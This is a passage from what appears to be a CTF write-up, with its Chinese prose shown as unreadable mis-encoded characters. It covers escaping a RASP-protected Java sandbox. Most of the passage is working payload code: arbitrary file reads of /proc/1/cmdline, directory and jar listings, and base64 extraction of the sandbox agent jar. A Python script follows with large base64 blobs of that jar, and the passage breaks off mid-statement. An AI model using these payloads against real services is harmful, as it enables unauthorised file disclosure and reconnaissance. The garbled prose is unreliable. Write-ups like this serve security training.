ä¸€ä¸‹</p><p>å…ˆæ˜¯ç”¨ä¸‹é¢çš„payloadä»»æ„æ–‡ä»¶è¯»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>            java.io.<span class="hljs-type">FileReader</span> <span class="hljs-variable">fr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.FileReader(<span class="hljs-string">&quot;/proc/1/cmdline&quot;</span>);<br>            java.io.<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">br</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(fr);<br>            String line;<br>            <span class="hljs-keyword">while</span> ((line = br.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                System.out.println(line);<br>            &#125;<br>            br.close();<br>        &#125; <span class="hljs-keyword">catch</span> (java.io.IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå¾—åˆ°å¯åŠ¨æœåŠ¡çš„å‚æ•°</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">java--add-opens=java.base/java.lang=ALL-UNNAMED-javaagent:/home/ctf/sandbox/lib/sandbox-agent.jar-jar/app/app.jar--server.port=80<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°æ˜¯ç»™æ²™ç®±ä¸Šäº†ä¸€ä¸ªagentæ¥æ£€æµ‹ç¨‹åºï¼Œä¹Ÿå°±æ˜¯RASPäº†</p><p>ç„¶åç”¨ä¸‹é¢çš„payloadæ¥åˆ—ç›®å½•</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">java.io.<span class="hljs-type">File</span> <span class="hljs-variable">folder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.File(<span class="hljs-string">&quot;/&quot;</span>);<br>        java.io.File[] listOfFiles = folder.listFiles();<br><br>        <span class="hljs-keyword">if</span> (listOfFiles != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">for</span> (java.io.File file : listOfFiles) &#123;<br>                <span class="hljs-keyword">if</span> (file.isFile()) &#123;<br>                    System.out.println(<span class="hljs-string">&quot;File: &quot;</span> + file.getName());<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (file.isDirectory()) &#123;<br>                    System.out.println(<span class="hljs-string">&quot;Directory: &quot;</span> + file.getName());<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;The directory does not exist or is not a directory.&quot;</span>);<br>        &#125;<br></code></pre></td></tr></table></figure><p>ä¸‹é¢çš„payloadçœ‹jaråŒ…çš„æ¡ç›®ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯ä¸€äº›åŒ…å«çš„æ–‡ä»¶å’Œç›®å½•ä¿¡æ¯</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    java.util.zip.<span class="hljs-type">ZipInputStream</span> <span class="hljs-variable">zis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.zip.ZipInputStream(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.FileInputStream(<span class="hljs-string">&quot;/app/app.jar&quot;</span>));<br>    java.util.zip.ZipEntry entry;<br>    <span class="hljs-keyword">while</span> ((entry = zis.getNextEntry()) != <span class="hljs-literal">null</span>) &#123;<br>        System.out.println(entry.getName());<br>        zis.closeEntry();<br>    &#125;<br>    zis.close();<br>&#125; <span class="hljs-keyword">catch</span> (java.io.IOException e) &#123;<br>    e.printStackTrace();<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”¨ä¸‹é¢çš„payloadä¸‹è½½agent.jarç„¶ååç¼–è¯‘æŸ¥çœ‹æºç </p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    java.io.<span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.File(<span class="hljs-string">&quot;/home/ctf/sandbox/lib/sandbox-agent.jar&quot;</span>); <span class="hljs-comment">// éœ€è¦è¯»å–çš„äºŒè¿›åˆ¶æ–‡ä»¶</span><br><br>    java.io.<span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedInputStream(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.FileInputStream(file));<br>            <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>]; <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªå­—èŠ‚æ•°ç»„ä½œä¸ºç¼“å†²åŒº</span><br>            <span class="hljs-type">int</span> bytesRead;<br><br>            <span class="hljs-keyword">while</span> ((bytesRead = bis.read(buffer)) != -<span class="hljs-number">1</span>) &#123; <span class="hljs-comment">// å¾ªç¯è¯»å–</span><br>                <span class="hljs-comment">// å¤„ç†è¯»å–çš„æ•°æ®ï¼ˆè¿™é‡Œå¯ä»¥è¿›è¡Œæ‰“å°ã€å¤„ç†ç­‰ï¼‰</span><br>                <span class="hljs-comment">//System.out.write(buffer, 0, bytesRead);</span><br>System.out.print(<span class="hljs-string">&#x27;&quot;&#x27;</span>);<br>                System.out.print(java.util.Base64.getEncoder().encodeToString(buffer));<br>System.out.println(<span class="hljs-string">&quot;\&quot;,&quot;</span>);<br><br>            &#125;<br><br><br>        &#125; <span class="hljs-keyword">catch</span> (<br>java.io.IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br></code></pre></td></tr></table></figure><p>ç„¶åpythonè„šæœ¬å†™å…¥jaråŒ…</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>data = [<span class="hljs-string">&quot;UEsDBAoAAAAAAAsdRlkAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkYvUEsDBAoAAAAIAAodRllB90L8xgAAAFMBAAAUAAAATUVUQS1JTkYvTUFOSUZFU1QuTUadj8FOwzAQRO+R8g/+gbVacUDKre0NEVSBxH0TT4ghXiN7E6V/j9sq4sKJ486M3uy0LH5AVnpHyj5KY/Z2V1eH1I9+QfqVzxPWOZvNqKtTAiscHS+NOXxzP8K0vEDq6jj7SW96uGTv7oKjJ/dV6I92Z/cPBC4lHxCl08Q5N6aPwfLkO+7Yfi7BZhbXxdXyNWRv0WeepdRcu1noFQ6DF9wBKAhNMzZPE0seYgp/2W9QemEtO6iFjtHRORXWumXKFdjLv16rqx9QSwMECgAAAAAACh1GWQAAAAAAAAAAAAAAAAQAAABjb20vUEsDBAoAAAAAAAodRlkAAAAAAAAAAAAAAAAMAAAAY29tL2FsaWJhYmEvUEsDBAoAAAAAAAodRlkAAAAAAAAAAAAAAAAQAAAAY29tL2FsaWJhYmEvanZtL1BLAwQKAAAAAAAKHUZZAAAAAAAAAAAAAAAAGAAAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L1BLAwQKAAAAAAAKHUZZAAAAAAAAAAAAAAAAHgAAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L2FnZW50L1BLAwQKAAAACAAKHUZZjfQUsW8FAADNCwAANgAAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L2FnZW50L1NhbmRib3hDbGFzc0xvYWRlci5jbGFzc5VWXVcTVxTdF0IGwigaCBRBSykgCWisrVYBrRWhYgNaoliktr0kAwxMZtKZCWq/1+qfaH9AV19xrVZau+xjH/pv+u5qu+9kEgKEpX3IzM255+x9Pu+dv/55+geAS/hWQ4OAvi43Zdo2/PSd+UycGxEdTYgKdBXkhjHp2Dnp3zX9Na48X9q+JzA0nAmMLGmvprO+a9qr48n9ohgEmnW0ICYQnTBt078skKhnuxCDjkMaDivtNlLX+jRpSc/LODJvuALx4aVM7SZtm3FUIJmVdn7ZeVijvGTLguEVZc64NOiNF6W/pt73NbQLHNnx4ebyupHzY0igU0OXjlfQvWu/7CMjWHHcgvQFLtaJYCmzF7BeQlrQg14Nx3WcwKsCZ3JOIS0tc1kuy/T6ZiHtlWNIy1XD9tP7I2I6fafiT7xewnvwmo5+vM6yrph2ft7wnJKbMwT6Dy5ZJZOqBoM6hpR166rhV4wV6rCOJFICh2pR2QkjB8OWfNNKT9mlguFK33TsAH9UxymFo9fge4ogreMM3hBoUwRBtPkgcIHBFzRboBaE/g==&quot;</span>,<br><span class="hljs-string">&quot;po63FEaLwgjESnpex9u4QEqXfNamEcJ2DO/DSC5oGBNo35FPPcwZReW88n1C58ywg1ssuhei1JuEe/u9a8UVvKvhqo5JXBM4GuybDncdz5DLFgvUlFNrgcZh5cb0Ljdur7nOg7LayTqE9QZKIDLp5GnQljFtY65UWDbc22WIeMbJSWtBuqb6Hwoj/prJeM5m/m9PjjMh1UET6Az1Jx3XuCHdadMybnHyBGLVXHoaPhA4Ue29WWmp0TLybMKqEj1SqMxHybUEDu9uVTZi1pe5jVlZrPhPNfrfdUDv0bHdUT8qViI/Wd9kYjfj5XENSzy96upquF+pF4s6c7MmipasuWpLv+SSafzlh2UfO88fGfbc0X3tJSAIn8jUaVzuaWHjU+seJ9uqHa6OvVgTKRWpyb7Zs6FhQ6Bvj3DO8aedkp2vCTj5UhOhaNQM1jkkSR2MwszKLcfzzKBGsWxwUqhuYo33N+FphcJT+6rj+J7vyuKs4a85ea8tCp4BPkoaNtWt9kBgYIfQtDedDSPkLV900zLnO+4jge9rwwgVy6DXyW4Z3kDGcTZKxTrDd5Ch6rk66i+4OkKISWlZWdM3xpvxSN1FzMSY4KE2Y9uGG2TCYIm+5HH5Um5r+LoyggeqkqasjD4eozq/DHh2qJuLqyh/LXgPDbjOlQ8NjXyfTkWeQSw2/s7H6FMl2oaW3UZrKn6k6Rnii40j2cXIaPZXdPyCY49p0YAZPg8H1h28ehO8Hjpxg//6yoh4HxkgWM2SWQSrOa4acFN9q1Byiz9eWnwqXz7jjrJMpEaeoG9WjP6IptGt1Mg2BmZHt7jRGFB2shuAYwykB63oxSEG1k7YHepElTqB+YA6ijZkcZsEdyhthniuvlk4VupOo42i/66W/mQt/UiZPlJDP0DIQdIPkX6Y9MkX0i/gLgk+pFSvShb3OHSvmpmP8HGQ40/IxKsrdPFvvhV7Url4eu7Un2g6taXWZ8civT+gJdUdeYJz3ZGtsUhqpHcb41uE0ulCHy6G7g+x+KoQUaQR48WtLt52nEMXzuM4LgSa/RgLwrlMrXYG+CkkrfvZKsvIcUUHqiEmwxDVKg+DLkdZ0BVaNAbBdlJSxlilZXlvlXsq7H40PoeuYe05jvD5L1UjGno0JAT/go+L1YSshwmxuD6BQtgy6aCGQFPqZxzbqnZlNBBeCYLQywqhwwI2roXGC3w38N2a+g3vCPyESOZxoBxljqbCbosH8c5TdofSLHO2UAPbGsKqaPhJPqPRjoZO4EmRHR3UFi5/D/E5/6kP6y/wFb5B939QSwMECgAAAAgACh1GWZNuBnUfFgAAyS8AADEAAABjb20vYWxpYmFiYS9qdm0vc2FuZA==&quot;</span>,<br><span class="hljs-string">&quot;Ym94L2FnZW50L0FnZW50TGF1bmNoZXIuY2xhc3OtWgl8VNXVP2cykzeZvJAwASQgEpA1q4KghEWSkJBANjMBDKDxkbwkA5OZdGYCpLZudana2iq2Fdxaa0sX2yK0Q4AK2r22drG2dret3fddbal8/3Pfm5mXZNj69Se+9+69557tnvVOnn396HEiWumaoJGLqbQ7MlBphILbjG1G5fadA5UxI9yzLbK70ugzw/HKank2GUPh7n4z6iM3eTTK1kkjL1PBdmOnURkywn2Vrdu2m91xpuwVwXAwvoopa8HCjTnko1yNdJ3yaAKTrsCDkcr6YMhkyouZg0bUiEeitf1GlIlr/WCrQKeJ5Ge6YMDYYdZGwt1GfFMw3o+vWNwIx2NM8xc0pekG4tFguG957cLxc34Ch8LCZJ2m0AVMOSmCTP5M8C4qEurTmJZlojF+KiPVLCrygfQMnS6imUwT+8x4wFJpbW9fmxHvZ5qXAX1GXG6aJRzNZroiw5ZzROKhAi/NZfKoE80Bb/N1WiAayW2q3tBS29DV3LqmTngu0amUynBS8Ui9acSHomazMch08enZHYoHQ5UAWi7bK3SqpEuYtKAcVijEFFgwBsyBSICiQwNiZI2pTyMejISTyMOmLEF9ke4dZry6pydqxmLLvbQIdmbE40Z3v1C9TKcltBRMQ9EtxoAZGzS6zTTTKdIZdCPbr9BpmWz3YntHZIcZlsnlOq2glTi8XdFg3KxWtNrN2FAIJl57TidxJgnEM5iu1Gm1HEJBe11gQ1NHV31jU11XW3VHgw82WyMuVss0OZPqNwpEnU71tBaaMHcHY+IX8LjNstCo0zq1EIyJo8lUk07NMuXtNsKbRCKNWpmmpTG3D4XjwQGzbne3OSgn4Kdsukosr51pts2C7biZ9dhCNRptgF85QRUpBI0O2iTiXI3lMbg2L9zopc04u7mx5cl/Ph9tpWs0ulanLrouyWZGTcKCcWoNkZg6eKZJCzIyt5W26dRNPbBMgLdFonGlrUYf9VKfRv06BWk7Dju9tTEcN/tMxAltpxEaMlt7maYsaHQityGAPUQDGoV1itDgqJBokcc59EaiA0Y8c1DZ4piyYmhm/XZQVKcYSYQ1BgfNMGQpcaKTEBow3zBkhrtTJwQlWyeg9u/UaZcEbU9vaCjWLzPDOr1RzXSHIjGYxJuYCtMYO/qjkV3GNjGg6+kGnW6kmxCzjZ6ewNDgoCjfBA9TnTykdsBCNboliQ1sNLamLEtM5VaxhpvEB27X6Q56K8zcTjq1ISMWa4oYPWZURZ78MT6cS3fR3Rq9Tae30z1gZ9QqrKE7ghCCwLLeHB7jO0nlbhYU79TpXroPRgBzGBONMxyCPQ==&quot;</span>,<br><span class="hljs-string">&quot;pdH9TJecOVsGxonhoz30bpH3PZkzVyb3Fhb36rSPHgSLg0PxMdHf5uecmPbSw0yLwXSFzXQFmK6wma7ojkTNipgZ3WlGK9qikd3DtZgIqLHw/ahO76X3IXGGIIqSiWnuWVKXAgPZ98N3ekyE9ciwRh/ASY4B8dHjtF+nD9GHgR/H0GzG+yOwqNVncRILv5Ni1OwNQdRKCwNIf9QKC42qYuiG/X6MPq7RJ3Q6QE/CZE+3UyJmeCcywBhPtTV5Fk+1p0Rth3T6pPhVvvKrxt62SCwWhFvIsSZ0OiyWlx01ByI7Tck1R3Q6KglossSmaGTQjMaDpgrdUiwIxKd1ekog8lNp2VKMrJ3Q6WlZm5AuMxoiA/DmzwBj2j22G9HKdUbUSghMn9Pp81KcTErvCgwOA8Ai+Qx9UUz2S4iJY4M/jPNZ+opGX9XpOfoa05xzSehIIlbU6ojURCJxrBmDDh8JmEa0G2XRNGfKdnCsMh7TN3T6pjA92VFRwV5TXDN9S6cX6NsoHsVgW6NrzN5g2HQQYlp53mWUYzts60XE3TN6k3CEYrU32Idj8tH36FGNvp88irEIvfRD2Go8ktrgpR+rxF0TDPdo9JNROQmaC5kGAuhL9DOdXpZ8rm+z5jZKkvLSL5jc27DTS7+y6pmmSLcR8tJvkL1sJoutuqm414BeeyokGv9Ojvr3Y/LJeNU4o7skvT/q9CdJqdkhM9wX7/fSX5BJrt0aK5kjq3/T6e/0D8QAZD50DrHTVDKb5dRe0elVgS0Ixloi8RoA7LDWNfoXzjJtEk3B8A6zp8GI9SPa++g18sj2/+j0umzPg9rSe+F/+E/SM7t0zmI3uIsNhoLxzGF44Zbxc17OBoqVcFv26pwjCteCsbqBwfgw6HKuzrpU5gVQNCzNQHFobURi4wk650tx52oNeHkiwviuYFh4KdR5Ek+WSszOVEzTT5/HN3sZONz9cGhBWqTzNEE6aU1dfbWUjIHqljU1rVd3NbQ2S/3OF+o8gy9i8qVZYlp7hhr8fBoJIVCs8yzRQ04wtgmGFtkV8/LFUhtdGVx47ZbKrVuvWbDFKH/jNQvVt4/n8jyN5+u8gBeOOskoaqfdlXBbVCeIDhpcalA1heVnaTVGbVwuBEp1LuPylKXBxxefrTByYGq2NgFTJV+i8aU6LxL5xrHanETu7hUH48vwNefSqkrZt1TnyyUu6VFzMITeoz4YjcW9vAxqCif7ES8vVwlRnYmX0Vp44tJsePlKJiSLauAbRPAXJdfqvEbwTU3HuXRekFDn5Xr43dzYStTLPm7gRo3XoTrk9UnGHdqrGQqGVOQ7g2bHg8P2m5k6l3f39gmR2HAsbg50DUR6hkKmTOBLvQ==&quot;</span>,<br><span class="hljs-string">&quot;7ajSJRYq4yEUEw4wSLQzCHTynVKF4hpiturcNiYHNaudIqKYe7vOATH3qUkz3xCoa5dedUOqUWLeoPNGwTJllLIUVZUVuIFqvNypun9V5wQHvbwFZ3FJhfpPcFyj87XcBU6sJFUfjQw429/W8ZpLqum/8ayNXjYQ9W12BtGNeLkbgeYSOUpT515perzxSDLHP879OgcZDUqhVSHEUWggqa6JDCCASH9mH2PM7B5CvT9cORYGRhLiAY3DOkcYAl10ZnCEUhCqxREHIkNR6aUvHEcivQrkUY5pHNd5iHcm66sMgFZVJinJKgkKFjja/A3tTUC0m4c1fqPO14sKdOei1brZ/Sy/Wecb+EaLzzYjijLDulJKoUyWKwJ8s863CL6cFLAfCW+Wj2/j2zW+Q+e38p2jGzdl7Tb2lONJs+OMH+kVOMvdQC+2XyGO4OO38z0av0Pndyr7zrTHUoY9HvaTl2ZpvAe9SBoYGQI6FH4ra1OfyeTH95HHy++GWiKxCnEtEeceyTB7dd4n4qKsaIrsMqO1Rgyamei46emqXlvX0gH5kpdqqnyQOzEnTEdHdW0DxAoE+8LKF5g2jDb3FRnM/Xzbo+WrEBcvqG2qDgS6Wuu7alvb6/BoqW9cu6G9DhVhaqWtvfXqTmsdUWBjXTsMpK65raOzK9DR3tiCmF2wvq5zVEaEhDLVUt1cF2irrsV4YjJxOuYUjIWyq7ENuTMJI4N8x2JbazuUpieXrWGOAHS0rq9rAabkkj2eKmvgu62uvaOxLpC+4EGsF7eQ9hb1acvQwDYz2iGllZyBlGwbjWhQxvakO94fhMWUn0W7o65ql0uISfcDMBQ07ZZ3Lz9zoXeme7mNkLLX2YKAOYGH4Z4bBmhMMWtx4ut1hNkpo0UfHkyKv+TsZjduRszK1bsL3jcqINj3IYi2wDs5teS4n8CaJySMIOqd6Q5PVQLC3YTREQcKCqDC3gFGbfZzu50NyKLzdxFVH6k+BxpLMRqTkBNO3bT6x9+gYFKRbu1Vvb3V10soGNtNp7SUnltRIhrkeEpLY3oAOO1peiQ4ok011dUASUS1xzLnaI9GX8PbHTTSXBJ4FNu8WW6qjCGJZv7BcX0y5BIl1Y82zuEF/5Xt/A9uqVGgxWwm8nqc3QEsZsfOgNkneKqjUWMYAmdoPjC7Y2ebEYzaoMnN/lGzCoHGP2JqPPsd/Tk7TtaA+GPWDrlE023m7Rwx8P9W6Pm0HDh15OGi01btabHPk5+MtHKSka0mRTNDycc0dK714P9SOYi83hXdIfvXNZ9VUllVj39U4K+QvXDC1EWLdbsVy8/mv/j4r/w3jf+u00T+x5i7G7n5sqlZP7vVG93xSBQm8MCCpg==&quot;</span>,<br><span class="hljs-string">&quot;cYAW0gbEnJAZm9MUiewYOkv5O2qjRPcM4Ge5Y7NR1CLgBRDHUXe9gpjAjC7Fy69BQcxW7+HlfyOfMCPKsh0Xy9XtzHYj6uX/IB6NXosNDltLpxAKOTldkY4yXhdD6czJhsbrymIqVj8OFccjxVH101CxJITiqmJO3q54XR4cRApfuc2cS1OzqXsj1QjC0xrDYZRrEjvNmObyMc09J7VrLj1Z0p8WFNHIAqZZhMxFRJNpmlwm4GuadFnq/SDezA/h20VzMH7YMb6UfPKbocDJz1bqfQe9FeuPyDo/Cvj3OuC/g/H7HOOHMH4sPeZVGL/fMZ6C8eOO8RUYf8AxrsL4g47x1Rjvd4w3Y/whx/g6jD/sGG/D+COO8QqMPzqGnycc49UY59tysvzcjZWPYVQp10p4e0oOU9aTCvTjeGaryWn8CTx1C4APsKz75Gdge/NlUISs+UoOUs5Ryic6MAbDDAcGHx9UDPikT86MoXA8hlmZMMjFqY3hcspSa3mC4SBNOkpTxyOZ60CSl0Ly+TMgmT4eycJMSORqI4XEZSMZoQsVkuLxSMozItl4OoVcPB7DpRkUksOH+JM2hvXA4MI73z/nEM0DLwtLR6h8U/psJ0BYoq3koWvwfa1CN8Xawp9S6OQrwYdBIodHUojvgKPJzun+S23EzWUjtBj/X14mJEaoSohkKSKzYWFE/SAShKa3Uy7tgH2EaBINgMR2WGFEES62UKYIT7cJ+xDSj8AfXXzUllbN8DEwWiI/ZltM8V5oRQPE/cfI13mQVh2m6pbyBK3ZSzPxathLPrzW76OJx6ils/wotREdpsCJY9TRWe4+TBur3EVuf6f2FLk7s0oCne7SQKenLEFbAp3ZeBkjZAZGaEeC3rCpyJ2gIXns3k9FVR77S6/KLvIUZSfozUWeE/spv8othIqA+i0nnoRsy6iXwnQ9DdIQ7ca7gm6FIm+2tbSO5G9EboB2boTt3wSt3AyN3KKgltFt1ER3UoDuos10Ow7rNjLo7cB3DzDeiv/eCUz3AOIdtIf2KG2ugjaW0Xr+NEMgrPj4OJ9Q8fF+XmZr+H5eKXFBfT3Nz0CfuXQnf4Y/C54+h9m15D1JxRr58k7RlfLnMSH1bytmNOog1uj6U5RD2WMWMK3WvK+Rq0ajm3NxTC/Qt3GAYjsftW1n9UG6reQI3emivVTM1uAdLvoAFaa+n6Y9zftp6jHa01lSepje1SwrZUfogSzaVHYgZWDTICohDE+kh6mIHqGF9H5aTI9DBfuVKkpAcR5gP89fULa9OqWA1fxFpYDFcEC1qsTOIdfCkzRJgya/hKEbANfD5b9MtbYIX7FFaHZy2sSlHyT3k6X+hxL0SHOZ/7Gspw==&quot;</span>,<br><span class="hljs-string">&quot;6PEEfbDM/xH7i/GGqTxhvzaVJuigheFTLlJe6VbyzAMHRAcpjw7BKD4JcxiBjEeolI5Cpqeoho7DHE44nKbZligPEj0LORjwi/kr/FWH01gzz9kyIuifpMLRIpbI37hYIrqegU7z4FST4dyLm/EYacHjWJUbz+NVntJj9Eyn+FmRZ4Q+C087TF84Ql92UZlMfH2EnoczZPu/k6DvVmlFmv8HHqigM8sfgl/hIcrwKEcrcmOmHBNPVHmx4SHZkFOUM05nVT5M/sieLPLZs0/TSwn66dLcybn7qAEAP7fIFGlC5tmAArXpeJVHi9r304wqHcCPjcW2qUg/gflfjqey9UCVR5zZ/+siz2H67QmY0UfoeZj09Sh3ssXW7aO7RQI97MNDX0WUeo4K6BsIqM+jNvkW1Ps8FPxdWkTfpyV4V9FLsKifwYtfRkT8JcXpN/Qm+i28+Xfw1z/CE/4KKn+nT9M/6Gv0T+z+Fyi+Qi/Sq/R7eo3+RKfoFfVbEHM2nWKN3ZzDHmUW9yCcv0hT+Wv8dZK/EfsLXwAD8YDmczCQb+Bwa+lz/E0YiAbaD/Hz/C2YRBzmIEaTA/o38AuY84GLbfRj/jblcg7p/B3g84hZqIhM6suK0h4uUEboQqTJ5RfxlQXdePi7+HIrIxRTtag+B6oWrefE1AUbojkpw2ygrFMQU9foLo2eTUYW69/3NHpcI7f1ZBVjik6JXGOA1YpdvX0PMrwKDVqJa6udU6dzCUqwkgT94REqKPH/OUF/3Ueaez+5s55IxRX5IzXiYsrmWciCs1EDFTsS7nT+vvicYtpDrqLVkpdeT1GqsaspKQH+OR63SuA8b1QJMApfruCTn+FsfJsB5Eri20taCfCVHhjDawlpXIqjKsNRlTiyuY1bff1AlYJCRRMqoi6f/G2c5fh8FRBJvr7xGL3WeZj+3QR6J/eSp/RAif9Ugrm57Pg+GZW1lB9f6s5a6pnsmex+jK4qn+xZJD6voLP3U1VRdiF7sEH8/7jnvbSwSMtahNV9NLNIcy9KwvlLZV5mrLh+q4f3n/q4ksxyqXrEdeJL0AItxilchtR/BQx7GerJKpqJBLYEBe5KvhKRr5rWcQ1t4FrqQi1mch3181raBZg38zqljcug2XUovH7IP4L0S6iGfwxtSPa40S47vIAX02bUjn38EuDSEVStwVAt7S0g7SRNhOWdpDyNf/I6efFkRNULoNKTNB+j12jCq3AMyxB/iuOcwRfZKeQunItE7lliiDNKjsB7aR9NKim100mobIR9OOKytCKsI26lCerHpauQNFscKWAW/8zySHy9bGf1Wfxz8ciUAAoq5Wk4/ply/DZ/vwB/s5DyLXObrewGZeVBzg==&quot;</span>,<br><span class="hljs-string">&quot;K+SCBPvFdtlhu5tgNk/TUlueR8GEsFFeUshTDvLUEZ7eNMIz99KMQp49wnNKE1zSXJbgir2UW1bIixO8pMlxyCqF81aY7jU44GvpQu6ii9HplHJ3SsYLcfy/5F8pxsrt+JNLs1VkY4eM5Y5ootJcaVrIX4PpJSmm19q1fi6YvqKQq8B02qMsKfsdHpprEXWQyrVJpZEvy4h8RSGvyoB84DyRH00hD9jI84F8taTkEa4ZRUBV9hyF9Q0BUdRBKH8cofyxhOQ3Q5vQfVChFI3zS8vsWm0mSNZZSbVMcmpZOQirypjXOooYi4EbgOxGmsc3pwoxoOLf8G+Vcc23XU2+Xla5Q77EZrMc7M13OF2WxEyLz99BIU+lFPICzFns7zpRRtMxbugs5KYCq5hHR3KhcDrCLSjpD9I8VPQo7rWDfFWg04vpjkBnQbYUOiLGYd7UXAYZry7kzSO8VT6vK+Rt8pngnrSGS0Cf+DZo+HaaxHciH9xNi/hequI9tIrvoDp+gNr4QdrCDzvc9DrbcD2YP6jctA47RSFON71uzIl4+fepNv1uhYdok5RffmTfvgRD929I8C7UYQl+U4JvOsRT4YPSePJbiA7xVSN8ayHfleC3qbl7MUerjvF9nYf5/kN0WyG/a4Tfk+AHDnHekyk3t/q2pbDVy2kyIejCuC+i5cgUjbSamhFsO6CKPygW/8h/wvsKNIl/xu5/quer6vkv9Typnq/LEwlYni71dKtntkso+fCV48p15VHR/wFQSwECFAMKAAAAAAALHUZZAAAAAAAAAAAAAAAACQAAAAAAAAAAABAA7UEAAAAATUVUQS1JTkYvUEsBAhQDCgAAAAgACh1GWUH3QvzGAAAAUwEAABQAAAAAAAAAAAAAAKSBJwAAAE1FVEEtSU5GL01BTklGRVNULk1GUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAAAQAAAAAAAAAAAAQAP1BHwEAAGNvbS9QSwECFAMKAAAAAAAKHUZZAAAAAAAAAAAAAAAADAAAAAAAAAAAABAA/UFBAQAAY29tL2FsaWJhYmEvUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAABAAAAAAAAAAAAAQAP1BawEAAGNvbS9hbGliYWJhL2p2bS9QSwECFAMKAAAAAAAKHUZZAAAAAAAAAAAAAAAAGAAAAAAAAAAAABAA/UGZAQAAY29tL2FsaWJhYmEvanZtL3NhbmRib3gvUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAAB4AAAAAAAAAAAAQAP1BzwEAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L2FnZW50L1BLAQIUAwoAAAAIAAodRg==&quot;</span>,<br><span class="hljs-string">&quot;WY30FLFvBQAAzQsAADYAAAAAAAAAAAAAALSBCwIAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L2FnZW50L1NhbmRib3hDbGFzc0xvYWRlci5jbGFzc1BLAQIUAwoAAAAIAAodRlmTbgZ1HxYAAMkvAAAxAAAAAAAAAAAAAAC0gc4HAABjb20vYWxpYmFiYS9qdm0vc2FuZGJveC9hZ2VudC9BZ2VudExhdW5jaGVyLmNsYXNzUEsFBgAAAAAJAAkAeAIAADweAAAAAFChFI3zS8vsWm0mSNZZSbVMcmpZOQirypjXOooYi4EbgOxGmsc3pwoxoOLf8G+Vcc23XU2+Xla5Q77EZrMc7M13OF2WxEyLz99BIU+lFPICzFns7zpRRtMxbugs5KYCq5hHR3KhcDrCLSjpD9I8VPQo7rWDfFWg04vpjkBnQbYUOiLGYd7UXAYZry7kzSO8VT6vK+Rt8pngnrSGS0Cf+DZo+HaaxHciH9xNi/hequI9tIrvoDp+gNr4QdrCDzvc9DrbcD2YP6jctA47RSFON71uzIl4+fepNv1uhYdok5RffmTfvgRD929I8C7UYQl+U4JvOsRT4YPSePJbiA7xVSN8ayHfleC3qbl7MUerjvF9nYf5/kN0WyG/a4Tfk+AHDnHekyk3t/q2pbDVy2kyIejCuC+i5cgUjbSamhFsO6CKPygW/8h/wvsKNIl/xu5/quer6vkv9Typnq/LEwlYni71dKtntkso+fCV48p15VHR/wFQSwECFAMKAAAAAAALHUZZAAAAAAAAAAAAAAAACQAAAAAAAAAAABAA7UEAAAAATUVUQS1JTkYvUEsBAhQDCgAAAAgACh1GWUH3QvzGAAAAUwEAABQAAAAAAAAAAAAAAKSBJwAAAE1FVEEtSU5GL01BTklGRVNULk1GUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAAAQAAAAAAAAAAAAQAP1BHwEAAGNvbS9QSwECFAMKAAAAAAAKHUZZAAAAAAAAAAAAAAAADAAAAAAAAAAAABAA/UFBAQAAY29tL2FsaWJhYmEvUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAABAAAAAAAAAAAAAQAP1BawEAAGNvbS9hbGliYWJhL2p2bS9QSwECFAMKAAAAAAAKHUZZAAAAAAAAAAAAAAAAGAAAAAAAAAAAABAA/UGZAQAAY29tL2FsaWJhYmEvanZtL3NhbmRib3gvUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAAB4AAAAAAAAAAAAQAP1BzwEAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L2FnZW50L1BLAQIUAwoAAAAIAAodRg==&quot;</span>]<br><br><span class="hljs-keyword">with</span> 